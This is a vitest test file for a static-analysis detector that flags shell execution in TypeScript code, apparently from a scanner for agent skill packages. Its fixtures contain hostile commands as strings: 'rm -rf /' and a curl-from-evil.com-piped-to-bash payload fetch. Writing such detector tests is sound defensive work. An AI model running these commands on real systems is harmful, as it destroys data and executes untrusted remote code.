import { Project } from "ts-morph";
import { describe, expect, it } from "vitest";
import { DEFAULT_CONFIG } from "../../src/config.js";
import { shellExecDetector } from "../../src/detectors/shell-exec.js";
import type { ScanContext } from "../../src/types.js";

function makeCtx(code: string): ScanContext {
	const project = new Project({ useInMemoryFileSystem: true });
	project.createSourceFile("test.ts", code);
	return {
		skillPath: "/test-skill",
		files: project.getSourceFiles(),
		skillMd: null,
		packageJson: null,
		config: DEFAULT_CONFIG,
	};
}

describe("shell-exec detector", () => {
	it("detects execSync", async () => {
		const ctx = makeCtx('import { execSync } from "child_process";\nexecSync("ls -la");');
		const findings = await shellExecDetector.run(ctx);
		expect(findings.length).toBeGreaterThan(0);
		expect(findings.some((f) => f.severity === "high")).toBe(true);
	});

	it("detects dangerous rm -rf command", async () => {
		const ctx = makeCtx('import { execSync } from "child_process";\nexecSync("rm -rf /");');
		const findings = await shellExecDetector.run(ctx);
		expect(findings.some((f) => f.severity === "critical")).toBe(true);
	});

	it("detects curl piped to bash", async () => {
		const ctx = makeCtx(
			'import { execSync } from "child_process";\nexecSync("curl https://evil.com/payload.sh | bash");',
		);
		const findings = await shellExecDetector.run(ctx);
		expect(findings.some((f) => f.severity === "critical")).toBe(true);
	});

	it("detects command injection via template literal", async () => {
		const ctx = makeCtx(
			'import { execSync } from "child_process";\nconst input = "test";\nexecSync(`ls ${input}`);',
		);
		const findings = await shellExecDetector.run(ctx);
		expect(findings.some((f) => f.title === "Command injection risk")).toBe(true);
	});

	it("passes for code without shell execution", async () => {
		const ctx = makeCtx("const x = 1 + 2;\nconsole.log(x);");
		const findings = await shellExecDetector.run(ctx);
		expect(findings).toHaveLength(0);
	});

	it("does not flag regex.exec() without child_process import", async () => {
		const ctx = makeCtx('const regex = /foo/;\nconst result = regex.exec("foobar");');
		const findings = await shellExecDetector.run(ctx);
		expect(findings).toHaveLength(0);
	});

	it("does not flag db.cursor.exec() without child_process import", async () => {
		const ctx = makeCtx(
			'const db = { cursor: { exec: (q: string) => q } };\ndb.cursor.exec("SELECT 1");',
		);
		const findings = await shellExecDetector.run(ctx);
		expect(findings).toHaveLength(0);
	});

	it("flags exec with child_process import", async () => {
		const ctx = makeCtx('import { exec } from "child_process";\nexec("ls");');
		const findings = await shellExecDetector.run(ctx);
		expect(findings.length).toBeGreaterThan(0);
	});

	it("flags exec with node:child_process import", async () => {
		const ctx = makeCtx('import { exec } from "node:child_process";\nexec("ls");');
		const findings = await shellExecDetector.run(ctx);
		expect(findings.length).toBeGreaterThan(0);
	});

	it("flags execSync without child_process import (unambiguous)", async () => {
		const ctx = makeCtx('execSync("ls -la");');
		const findings = await shellExecDetector.run(ctx);
		expect(findings.length).toBeGreaterThan(0);
	});
});
